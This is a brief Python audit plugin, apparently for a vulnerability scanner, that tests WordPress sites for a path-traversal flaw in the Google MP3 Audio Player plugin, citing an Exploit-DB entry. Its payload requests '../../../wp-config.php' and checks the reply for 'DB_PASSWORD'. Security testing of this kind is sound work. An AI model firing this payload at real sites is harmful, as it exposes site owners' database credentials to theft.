#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '冷不冷'
#http://www.exploit-db.com/exploits/35460/

import  re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    payload = 'plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php'
    verify_url = url + '/wp-content/' + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if 'DB_PASSWORD' in res:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])